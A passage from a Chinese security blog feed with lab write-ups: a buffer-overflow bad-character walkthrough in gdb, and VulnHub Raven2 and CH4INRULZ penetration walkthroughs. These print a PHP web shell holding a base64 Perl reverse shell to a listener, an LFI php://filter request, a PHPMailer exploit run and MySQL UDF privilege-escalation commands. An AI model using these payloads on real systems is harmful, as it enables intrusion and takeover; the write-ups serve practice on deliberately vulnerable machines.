-w256</code></pre><p>此字符串长度为256字节。所以我们需要重新计算我们的缓冲区。</p><h4 id="Notes"><a href="#Notes" class="headerlink" title="Notes"></a>Notes</h4><pre><code class="shell-session">Buffer = &quot;\x55&quot; * (1040 - 256 - 4) = 780 CHARS = &quot;\x00\x01\x02\x03\x04\x05...&lt;SNIP&gt;...\xfd\xfe\xff&quot;   EIP = &quot;\x66&quot; * 4</code></pre><p>现在让我们来看看整个主要功能。因为如果我们现在执行它，程序就会崩溃，而不会让我们有可能跟踪内存中发生的事情。因此，我们将在相应的函数处设置一个断点，以便在此时停止执行，并且我们可以分析内存的内容。</p><pre><code class="shell-session">(gdb) disas mainDump of assembler code for function main:   0x56555582 &lt;+0&gt;: lea    ecx,[esp+0x4]   0x56555586 &lt;+4&gt;: and    esp,0xfffffff0   0x56555589 &lt;+7&gt;: push   DWORD PTR [ecx-0x4]   0x5655558c &lt;+10&gt;:push   ebp   0x5655558d &lt;+11&gt;:mov    ebp,esp   0x5655558f &lt;+13&gt;:push   ebx   0x56555590 &lt;+14&gt;:push   ecx   0x56555591 &lt;+15&gt;:call   0x56555450 &lt;__x86.get_pc_thunk.bx&gt;   0x56555596 &lt;+20&gt;:add    ebx,0x1a3e   0x5655559c &lt;+26&gt;:mov    eax,ecx   0x5655559e &lt;+28&gt;:mov    eax,DWORD PTR [eax+0x4]   0x565555a1 &lt;+31&gt;:add    eax,0x4   0x565555a4 &lt;+34&gt;:mov    eax,DWORD PTR [eax]   0x565555a6 &lt;+36&gt;:sub    esp,0xc   0x565555a9 &lt;+39&gt;:push   eax   0x565555aa &lt;+40&gt;:call   0x5655554d &lt;bowfunc&gt;# &lt;---- bowfunc Function   0x565555af &lt;+45&gt;:add    esp,0x10   0x565555b2 &lt;+48&gt;:sub    esp,0xc   0x565555b5 &lt;+51&gt;:lea    eax,[ebx-0x1974]   0x565555bb &lt;+57&gt;:push   eax   0x565555bc &lt;+58&gt;:call   0x565553e0 &lt;puts@plt&gt;   0x565555c1 &lt;+63&gt;:add    esp,0x10   0x565555c4 &lt;+66&gt;:mov    eax,0x1   0x565555c9 &lt;+71&gt;:lea    esp,[ebp-0x8]   0x565555cc &lt;+74&gt;:pop    ecx   0x565555cd &lt;+75&gt;:pop    ebx   0x565555ce &lt;+76&gt;:pop    ebp   0x565555cf &lt;+77&gt;:lea    esp,[ecx-0x4]   0x565555d2 &lt;+80&gt;:ret    End of assembler dump.</code></pre><p>为了设置断点，我们给命令“break”赋予相应的函数名。</p><h4 id="GDB-Breakpoint"><a href="#GDB-Breakpoint" class="headerlink" title="GDB Breakpoint"></a>GDB Breakpoint</h4><pre><code class="shell-session">(gdb) break bowfunc Breakpoint 1 at 0x56555551</code></pre><p>现在，我们可以执行新创建的输入并查看内存。</p><pre><code class="shell-session">(gdb) run $(python -c &#39;print &quot;\x55&quot; * (1040 - 256 - 4) + &quot;\x00\x01\x02\x03\x04\x05...&lt;SNIP&gt;...\xfc\xfd\xfe\xff&quot; + &quot;\x66&quot; * 4&#39;)Starting program: /home/student/bow/bow32 $(python -c &#39;print &quot;\x55&quot; * (1040 - 256 - 4) + &quot;\x00\x01\x02\x03\x04\x05...&lt;SNIP&gt;...\xfc\xfd\xfe\xff&quot; + &quot;\x66&quot; * 4&#39;)/bin/bash: warning: command substitution: ignored null byte in inputBreakpoint 1, 0x56555551 in bowfunc ()</code></pre><p>在我们用坏字符执行缓冲区并到达断点之后，我们可以查看堆栈。</p><h4 id="The-Stack"><a href="#The-Stack" class="headerlink" title="The Stack"></a>The Stack</h4><pre><code class="shell-session">(gdb) x/2000xb $esp+5000xffffd28a:0xbb0x690x360x380x360x000x000x000xffffd292:0x000x000x000x000x000x000x000x000xffffd29a:0x000x2f0x680x6f0x6d0x650x2f0x730xffffd2a2:0x740x750x640x650x6e0x740x2f0x620xffffd2aa:0x6f0x770x2f0x620x6f0x770x330x320xffffd2b2:0x00    0x550x550x550x550x550x550x55                 # |---&gt; &quot;\x55&quot;s begin0xffffd2ba: 0x550x550x550x550x550x550x550x550xffffd2c2: 0x550x550x550x550x550x550x550x55&lt;SNIP&gt;</code></pre><p>在这里，我们认识到我们的“\x55”是从哪个地址开始的。从这里，我们可以走得更远，寻找CHARS的起点。</p><h4 id="The-Stack-CHARS"><a href="#The-Stack-CHARS" class="headerlink" title="The Stack - CHARS"></a>The Stack - CHARS</h4><pre><code class="shell-session">&lt;SNIP&gt;0xffffd5aa:0x550x550x550x550x550x550x550x550xffffd5b2:0x550x550x550x550x550x550x550x550xffffd5ba:0x550x550x550x550x550x010x020x03                                                 # |---&gt; CHARS begin0xffffd5c2:0x040x050x060x070x080x000x0b0x0c0xffffd5ca:0x0d0x0e0x0f0x100x110x120x130x140xffffd5d2:0x150x160x170x180x190x1a0x1b0x1c&lt;SNIP&gt;</code></pre><p>我们看到“\x55”在哪里结束，CHARS变量在哪里开始。但如果我们仔细观察它，我们会发现它以“\x01”而不是“\x00”开头。我们已经在执行过程中看到了输入中的空字节被忽略的警告。 因此，我们可以注意到这个字符，将其从变量CHARS中删除，并调整“\x55”的编号。</p><h4 id="Notes-1"><a href="#Notes-1" class="headerlink" title="Notes"></a>Notes</h4><pre><code class="shell-session"># Substract the number of removed charactersBuffer = &quot;\x55&quot; * (1040 - 255 - 4) = 781# &quot;\x00&quot; removed: 256 - 1 = 255 bytes CHARS = &quot;\x01\x02\x03...&lt;SNIP&gt;...\xfd\xfe\xff&quot;    EIP = &quot;\x66&quot; * 4</code></pre><h4 id="Send-CHARS-Without-Null-Byte"><a href="#Send-CHARS-Without-Null-Byte" class="headerlink" title="Send CHARS - Without Null Byte"></a>Send CHARS - Without Null Byte</h4><pre><code class="shell-session">(gdb) run $(python -c &#39;print &quot;\x55&quot; * (1040 - 255 - 4) + &quot;\x01\x02\x03\x04\x05...&lt;SNIP&gt;...\xfc\xfd\xfe\xff&quot; + &quot;\x66&quot; * 4&#39;)The program being debugged has been started already.Start it from the beginning? (y or n) yStarting program: /home/student/bow/bow32 $(python -c &#39;print &quot;\x55&quot; * (1040 - 255 - 4) + &quot;\x01\x02\x03\x04\x05...&lt;SNIP&gt;...\xfc\xfd\xfe\xff&quot; + &quot;\x66&quot; * 4&#39;)Breakpoint 1, 0x56555551 in bowfunc ()</code></pre><h4 id="The-Stack-1"><a href="#The-Stack-1" class="headerlink" title="The Stack"></a>The Stack</h4><pre><code class="shell-session">(gdb) x/2000xb $esp+550&lt;SNIP&gt;0xffffd5ba:0x550x550x550x550x550x010x020x030xffffd5c2:0x040x050x060x070x080x000x0b0x0c                                                 # |----| &lt;- &quot;\x09&quot; expected0xffffd5ca:0x0d0x0e0x0f0x100x110x120x130x14&lt;SNIP&gt;</code></pre><p>在这里，它取决于我们的字节在变量CHARS中的正确顺序，以查看是否有任何字符更改、中断或跳过顺序。现在我们认识到，在“\x08”之后，我们遇到的是“\x00”，而不是预期的“\x09”。这告诉我们，此处不允许使用此字符，必须相应地删除。</p><h4 id="Notes-2"><a href="#Notes-2" class="headerlink" title="Notes"></a>Notes</h4><pre><code class="shell-session"># Substract the number of removed charactersBuffer = &quot;\x55&quot; * (1040 - 254 - 4) = 782# &quot;\x00&quot; &amp; &quot;\x09&quot; removed: 256 - 2 = 254 bytes CHARS = &quot;\x01\x02\x03\x04\x05\x06\x07\x08\x0a\x0b...&lt;SNIP&gt;...\xfd\xfe\xff&quot;     EIP = &quot;\x66&quot; * 4</code></pre><h4 id="Send-CHARS-Without-“-x00”-amp-“-x09”"><a href="#Send-CHARS-Without-“-x00”-amp-“-x09”" class="headerlink" title="Send CHARS - Without “\x00” &amp; “\x09”"></a>Send CHARS - Without “\x00” &amp; “\x09”</h4><pre><code class="shell-session">(gdb) run $(python -c &#39;print &quot;\x55&quot; * (1040 - 254 - 4) + &quot;\x01\x02\x03\x04\x05\x06\x07\x08\x0a\x0b...&lt;SNIP&gt;...\xfc\xfd\xfe\xff&quot; + &quot;\x66&quot; * 4&#39;)The program being debugged has been started already.Start it from the beginning? (y or n) yStarting program: /home/student/bow/bow32 $(python -c &#39;print &quot;\x55&quot; * (1040 - 254 - 4) + &quot;\x01\x02\x03\x04\x05\x06\x07\x08\x0a\x0b...&lt;SNIP&gt;...\xfc\xfd\xfe\xff&quot; + &quot;\x66&quot; * 4&#39;)Breakpoint 1, 0x56555551 in bowfunc ()</code></pre><h4 id="The-Stack-2"><a href="#The-Stack-2" class="headerlink" title="The Stack"></a>The Stack</h4><pre><code class="shell-session">(gdb) x/2000xb $esp+550&lt;SNIP&gt;0xffffd5ba:0x550x550x550x550x550x010x020x030xffffd5c2:0x040x050x060x070x080x000x0b0x0c                                                 # |----| &lt;- &quot;\x0a&quot; expected0xffffd5ca:0x0d0x0e0x0f0x100x110x120x130x14&lt;SNIP&gt;</code></pre><p>必须重复此过程，直到删除所有可能中断流的字符为止。</p><h4 id="practice-2"><a href="#practice-2" class="headerlink" title="practice"></a>practice</h4><pre><code>target:找到所有更改或中断发送字节顺序的坏字符，并将其作为答案提交（例如，格式：\x0\x11）。</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> base </tag>
            
            <tag> hackthebox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Penetration-Raven2</title>
      <link href="/2023/06/23/Penetration-bbb/"/>
      <url>/2023/06/23/Penetration-bbb/</url>
      
        <content type="html"><![CDATA[<p>vulhub的raven2靶机：</p><span id="more"></span><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306231706056.png" alt="image-20230623135918904"></p><p>确认靶机地址为192.168.91.133</p><p>扫描一下：<code>nmap -sV -sC 192.168.91.133 --script=vuln</code></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306231707310.png" alt="image-20230623140353745"></p><p>1.发现80端口的网站可能有csrf漏洞</p><p>2.目录枚举发现一些路径</p><p>3.有一些可能存在的漏洞</p><p>4.使用了wordpress搭建博客</p><p>先进网站看一看：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306231707306.png" alt="image-20230623143033224"></p><p>知道wordpress的版本是4.8.22，popper的版本是1.12.9，apache服务器的版本是2.4.10，使用mysql数据库，网站暂时没有其他有用的东西，有一个登录接口，但是实际链接到主页，也没有用：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306231708604.png" alt="image-20230623143221923"></p><p>扫描一下目录：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306231707925.png" alt="image-20230623143328697"></p><p>1.发现很多可用的路径，先上去看看一些看起来比较特殊的路径</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306231709066.png" alt="image-20230623143812489"></p><p>1.原本以为会是一个可以上传文件的接口，上去后发现只有一张图片，居然正好是一个flag，xs~：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306231707542.png" alt="image-20230623143936977"></p><p>&#x3D;&#x3D;&gt;</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306231707650.png" alt="image-20230623143950145"></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306231707431.png" alt="image-20230623144450799"></p><p>这两个页面访问不了</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306231707340.png" alt="image-20230623144827225"></p><p>1.在这个vendor页面发现了很多东西</p><p>2.在readme里面发现了使用PHPMailer，在后续文档中发现版本号可能是5.2.16</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306231709461.png" alt="image-20230623145728081"></p><p>在path中发现了webroot路径，还得到了一个flag</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306231709732.png" alt="image-20230623145318082"></p><p>webroot：&#x2F;var&#x2F;www&#x2F;html</p><p>现在几乎遍历了整个网站，找到了两个flag，接下来大致至少有三个攻击面：一是攻击wordpress4.8.22，另一个是攻击PHPmailer5.2.16，然后是MySQL数据库的udf提权，但是这需要先得到shell。这里先搜寻一下有没有相关漏洞：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306231709760.png" alt="image-20230623150149932"></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306231709447.png" alt="image-20230623150227108"></p><p>显然PHPMailer上的RCE漏洞是更好的选择</p><p>这里使用一下这个py脚本，在库中找到40974.py,复制一份到外面的目录中</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306231709502.png" alt="image-20230623154615369"></p><p>这个脚本应该是上传一个脚本通过socket连接反弹shell,通过访问这个contact.php触发生成后门文件，再访问后门文件触发shell反弹</p><p>1.target是我们脚本的保存位置</p><p>2.连接的主机是本机ip，然后端口是4444</p><p>3.这里需要填入之前找到的webroot</p><p>注意：这里的各个位置都要修改名字或者ip，我也不知道为什么不修改无法成功拿到shell</p><p>运行脚本<code> python 40974.py</code></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306231709752.png" alt="image-20230623153627953"></p><p>访问这个地址就可以触发shell</p><p><code>nc -lvnp 4444</code></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306231710690.png" alt="image-20230623154738288"></p><p>拿到了shell</p><p>试着提权：</p><p><code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p><p>然后找找flag，因为之前的flag都属flag + N 的形式，所以这里使用正则加一个位置：</p><p><code>find ./ -name &quot;flag*.txt&quot; 2&gt;/dev/null</code></p><p>拿到flag</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306231710350.png" alt="image-20230623155307556"></p><p>我们之前的思路，还有wordpress没有探索，以及数据库。</p><p>我们进入wordpress目录，里面的文件之前目录遍历基本上都没有成功访问，读一读配置文件之类的：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306231710667.png" alt="image-20230623160219544"></p><p>好得不行，root：R@v3nSecurity</p><p>连接数据库：</p><pre><code>www-data@Raven:/var/www/html/wordpress$ mysql -u root -pmysql -u root -pEnter password: R@v3nSecurity</code></pre><p>这里看到版本号为5.5.60</p><pre><code>Welcome to the MySQL monitor.  Commands end with ; or \g.Your MySQL connection id is 73Server version: 5.5.60-0+deb8u1 (Debian)</code></pre><p>UDF提权还没学习到，这里直接参照一下其他师傅的博客复刻一下：</p><p>直接搜索5.5.6没有udf提权漏洞，搜索了一下，发先有以下要求：</p><p>1.如果mysql版本大于5.1，udf.dll文件必须放置在mysql安装目录的lib\plugin文件夹下</p><p>2.如果mysql版本小于5.1， udf.dll文件在windows server 2003下放置于c:\windows\system32目录，在windows server 2000下放置在c:\winnt\system32目录</p><p>3.所拥有的权限必须有insert和delete的权限</p><p>4.具有目录的写权限<br><a href="https://blog.csdn.net/weixin_36433730/article/details/113208982">https://blog.csdn.net/weixin_36433730/article/details/113208982</a></p><p>由于我们拿到了root账户，那可以try一try：</p><p>这里还看到一位博主的说法：</p><p><code>show global variables like &#39;secure%&#39;;</code></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306231710434.png" alt="image-20230623161826094"></p><p>[(146条消息) VulnHub-Raven-靶机渗透学习_嗯嗯呐的博客-CSDN博客](<a href="https://blog.csdn.net/shenyu_1126/article/details/109614583?ops_request_misc=%7B%22request_id%22:%22168749990116800185833529%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=168749990116800185833529&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-1-109614583-null-null.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=raven">https://blog.csdn.net/shenyu_1126/article/details/109614583?ops_request_misc=%7B%22request%5Fid%22%3A%22168749990116800185833529%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=168749990116800185833529&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-1-109614583-null-null.142^v88^control_2,239^v2^insert_chatgpt&amp;utm_term=raven</a> tty1&amp;spm&#x3D;1018.2226.3001.4187)</p><p>这里使用的是这个文件，一样的先拷贝出来：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306231710374.png" alt="image-20230623161946083"></p><pre><code>cp /usr/share/exploitdb/exploits/linux/local/1518.c ./gcc -g -c 1518.cgcc -g -shared -o  raptor_udf.so 1518.o -lc</code></pre><p>这里的意思是（GPT）：</p><pre><code>cp /usr/share/exploitdb/exploits/linux/local/1518.c ./：这个命令将 /usr/share/exploitdb/exploits/linux/local/1518.c 文件复制到当前目录 (./) 中。gcc -g -c 1518.c：这个命令使用 GCC 编译器编译名为 1518.c 的 C 源文件，并生成一个目标文件 1518.o。选项 -g 表示生成调试信息。gcc -g -shared -o raptor_udf.so 1518.o -lc：这个命令使用 GCC 编译器将 1518.o 目标文件链接为一个共享库 raptor_udf.so。选项 -g 表示生成调试信息，选项 -shared 表示生成一个共享库，选项 -o 指定输出的文件名。最后的 -lc 是链接 C 标准库。</code></pre><p>暂时还不是很理解，先move on</p><p>将文件上传到靶机：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306231710610.png" alt="image-20230623163103803"></p><p>进入数据库创建数据表 foo，向表中插入二进制数据，然后利用dumpfile函数把文件导出， 再新建存储函数do_system类型是integer，别名（soname）文件名字</p><pre><code>mysql -u root -pR@v3nSecurityuse mysql;create table foo(line blob);insert into foo values(load_file(&#39;/var/www/html/raptor_udf.so&#39;));select * from foo into dumpfile &#39;/usr/lib/mysql/plugin/raptor_udf.so&#39;;create function do_system returns integer soname &#39;raptor_udf.so&#39;;select * from foo into dumpfile &#39;/usr/lib/mysql/plugin/raptor_udf.so&#39;;create function do_system returns integer soname &#39;raptor_udf.so&#39;;</code></pre><p>通过do_system函数给find命令所有者的suid权限，使其可以执行root权限的命令</p><pre><code class="bash">select do_system(&#39;chmod u+s /usr/bin/find&#39;);</code></pre><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306231710641.png" alt="image-20230623164007615"></p><p>此时find命令拥有root权限，通过-exec tag 执行命令，但是不知道为什么能够直接获得root权限而不是反复调用-exec tag。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306231711406.png" alt="image-20230623165637187"></p>]]></content>
      
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Penetration_CH4INRULZ_v1.0.1</title>
      <link href="/2023/06/22/Penetration-aaa/"/>
      <url>/2023/06/22/Penetration-aaa/</url>
      
        <content type="html"><![CDATA[<p>关于vulhub靶机CH4INRULZ_v1.0.1的渗透测试练习</p><span id="more"></span><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/image-20230622210550264.png" alt="image-20230622210550264"></p><p>1.主机发现，同网段多了一个192.168.91.130，应该就是目标靶机</p><p>2.Ping一下靶机，可以连通，初步猜测目标靶机是Linux系统</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/image-20230622211057766.png" alt="image-20230622211057766"></p><p>1.通过扫描端口发现四个开放端口，21端口上有一个ftp服务，初步猜测运行的应用软件是vsftpd2.3.5，并且允许匿名登录</p><p>2.在22端口上开放了ssh服务，初步猜测运行的软件是openssh5.9p1，服务器是Debian Ubuntu1.10，采用了DSA、RSA、ECDSA三种加密方式</p><p>3.80端口上开放了一个http服务器，初步猜测网站使用apache httpd 2.2.22服务器，网站名叫做 FRANK’s Website ,应该是个博客网站</p><p>4.8011也开放了一个http服务器，初步猜测网站使用apache httpd 2.2.22服务器</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306231021610.png" alt="image-20230622212156831"></p><p>发现匿名ftp登录后什么也做不了</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/image-20230622212610705.png" alt="image-20230622212610705"></p><p>seebug和exploit db 都没有发现ftp相关版本的漏洞</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/image-20230622213625172.png" alt="image-20230622213625172"></p><p>1.openssh发现由信息泄露和缓冲区溢出漏洞</p><p>2.发现用户名枚举、命令执行等漏洞</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/image-20230622214007571.png" alt="image-20230622214007571"></p><p>1.测试发现可以进行爆破</p><p>192.168.91.130主机22端口的ssh服务存在用户名枚举漏洞，如果能够枚举用户名再用字典爆破账户得到密码就可以通过ssh登录主机，得到一个shell</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/image-20230622214849719.png" alt="image-20230622214849719"></p><p>1.在exploit db里发现路径遍历、远程缓冲区溢出等问题</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/image-20230622215026127.png" alt="image-20230622215026127"></p><p>1.发现WEB服务器为ApacheHTTPServer ，操作系统为Ubuntu等信息</p><p>可以通过路径遍历寻找一些有漏洞的页面，比如有文件包含的页面、访问一些配置文件拿到账户信息进行后台访问</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/image-20230622220606960.png" alt="image-20230622220606960"></p><p>1.通过目录扫描得到四个目录</p><p><a href="http://192.168.91.130/css/">http://192.168.91.130/css/</a>  </p><p><a href="http://192.168.91.130/img/">http://192.168.91.130/img/</a>   </p><p><a href="http://192.168.91.130/js/">http://192.168.91.130/js/</a> </p><p><a href="http://192.168.91.130/vendor/">http://192.168.91.130/vendor/</a></p><p>若干页面：</p><p><a href="http://192.168.91.130/cgi-bin/">http://192.168.91.130/cgi-bin/</a>                                                                                                                       </p><ul><li><a href="http://192.168.91.130/development">http://192.168.91.130/development</a>                                                                                                                 </li><li><a href="http://192.168.91.130/index">http://192.168.91.130/index</a>                                                             </li><li><a href="http://192.168.91.130/index.html">http://192.168.91.130/index.html</a>                                                                                                                       </li><li><a href="http://192.168.91.130/LICENSE">http://192.168.91.130/LICENSE</a>                                                        </li><li><a href="http://192.168.91.130/robots">http://192.168.91.130/robots</a>                                                            </li><li><a href="http://192.168.91.130/robots.txt">http://192.168.91.130/robots.txt</a>                                                       </li><li><a href="http://192.168.91.130/server-status">http://192.168.91.130/server-status</a></li></ul><p>访问后除了develop页面有一个登录接口发现没有其他有用的信息</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/image-20230622222021984.png" alt="image-20230622222021984"></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/image-20230622221738051.png" alt="image-20230622221738051"></p><p>在8011端口下也发现一些页面</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/image-20230622222325156.png" alt="image-20230622222325156"></p><p>1.发现提供了一些接口页面</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/image-20230622222402310.png" alt="image-20230622222402310"></p><p>1.发现files_api.php好像可以读入文件</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/image-20230622222941693.png" alt="image-20230622222941693"></p><p>1.确实可以读入文件</p><p>2.这里有一个frank账户名，而网站也是frank的个人博客，猜测之前登录页面用户名可以使用frank</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/image-20230622224049866.png" alt="image-20230622224049866"></p><p>1.找到一个备份文件</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/image-20230622224405581.png" alt="image-20230622224405581"></p><p>1.我们得到了一个明文账户名frank和加密后的密码   $apr1$1oIGDEDK$&#x2F;aVFPluYt56UvslZMBDoC0</p><p>2.我们可以用这个账户密码访问develop路径</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/image-20230622224647449.png" alt="image-20230622224647449"></p><p>1.发现密码是一串hash值</p><p>没有好的彩虹表，使用工具看能不能破解：john pass.txt</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/image-20230622234057284.png" alt="image-20230622234057284"></p><p>1.发现密码是弱口令 frank！！！</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/image-20230622225714532.png" alt="image-20230622225714532"></p><p>1.成功访问develop页面，根据提示有一个uploader工具，猜测可能有文件上传漏洞</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/image-20230622225830732.png" alt="image-20230622225830732"></p><p>1.发现可以上传图片</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/image-20230622230226873.png" alt="image-20230622230226873"></p><p>1.检查源码发现一个提交页面</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/image-20230622230306268.png" alt="image-20230622230306268"></p><p>1.发现只支持图片类型文件上传，猜测可以使用文件头欺骗或者合并文件上传一个反弹shell的木马</p><pre><code class="shell">GIF98&lt;?phpfunction which($pr) &#123;$path = execute(&quot;which $pr&quot;);return ($path ? $path : $pr);&#125;function execute($cfe) &#123;$res = &#39;&#39;;if ($cfe) &#123;if(function_exists(&#39;exec&#39;)) &#123;@exec($cfe,$res);$res = join(&quot;\n&quot;,$res);&#125; elseif(function_exists(&#39;shell_exec&#39;)) &#123;$res = @shell_exec($cfe);&#125; elseif(function_exists(&#39;system&#39;)) &#123;@ob_start();@system($cfe);$res = @ob_get_contents();@ob_end_clean();&#125; elseif(function_exists(&#39;passthru&#39;)) &#123;@ob_start();@passthru($cfe);$res = @ob_get_contents();@ob_end_clean();&#125; elseif(@is_resource($f = @popen($cfe,&quot;r&quot;))) &#123;$res = &#39;&#39;;while(!@feof($f)) &#123;$res .= @fread($f,1024);&#125;@pclose($f);&#125;&#125;return $res;&#125;function cf($fname,$text)&#123;if($fp=@fopen($fname,&#39;w&#39;)) &#123;@fputs($fp,@base64_decode($text));@fclose($fp);&#125;&#125;$yourip = &quot;192.168.91.129&quot;;$yourport = &#39;4444&#39;;$usedb = array(&#39;perl&#39;=&gt;&#39;perl&#39;,&#39;c&#39;=&gt;&#39;c&#39;);$back_connect=&quot;IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj&quot;.&quot;aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR&quot;.&quot;hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT&quot;.&quot;sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI&quot;.&quot;kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi&quot;.&quot;KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl&quot;.&quot;OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==&quot;;cf(&#39;/tmp/.bc&#39;,$back_connect);$res = execute(which(&#39;perl&#39;).&quot; /tmp/.bc $yourip $yourport &amp;&quot;);?&gt;</code></pre><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/image-20230623000504568.png" alt="image-20230623000504568"></p><p>上传之后没有给出具体路径，根据反馈确实进行了文件头检测</p><p>想起之前有一个文件包含漏洞，根据打靶经验，或许可以使用base64编码导出这个上传页面的源码看看有没有隐藏信息</p><pre><code class="curl">curl -X POST -d &quot;file=php://filter/read=convert.base64-encode/resource=/var/www/development/uploader/upload.php&quot; &quot;http://192.168.91.130:8011/api/files_api.php&quot;</code></pre><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/image-20230622232737020.png" alt="image-20230622232737020"></p><p>1.发现文件保存在当前目录的”FRANKuploads&#x2F;“路径下</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306231020353.png" alt="image-20230623000538642"></p><p>触发一下木马：</p><p>cur l-X POST -d </p><p>“file&#x3D;&#x2F;var&#x2F;www&#x2F;development&#x2F;uploader&#x2F;FRANKuploads&#x2F;shell_nc.png” “<a href="http://192.168.91.130:8011/api/files_api.php">http://192.168.91.130:8011/api/files_api.php</a>“</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/image-20230623000855003.png" alt="image-20230623000855003"></p><p>得到shell</p><p>看一下能不能提权</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306231056447.png" alt="image-20230623105618697"></p><p>一句话提权之后再次提权发现之前的密码不对</p><p>uname -a &#x3D;&gt;</p><pre><code>Linux ubuntu 2.6.35-19-generic #28-Ubuntu SMP Sun Aug 29 06:34:38 UTC 2010 x86_64 GNU/Linux</code></pre><p>看看有无漏洞，（后渗透提权没还怎么深入学过，这里是参照网上博主的博客<a href="https://blog.csdn.net/weixin_43940853/article/details/103500588?ops_request_misc=&request_id=&biz_id=102&utm_term=CH4INRULZ_v1.0.1&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-103500588.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&spm=1018.2226.3001.4187">(146条消息) 靶机CH4INRULZ_v1.0.1_WuT0ng的博客-CSDN博客</a>）</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306231120704.png" alt="image-20230623112053281"></p><p>发现在2.6.36的版本中有一个提权漏洞，于是将对应的15285.c通过搭建本地服务器发送到靶机</p><p><img 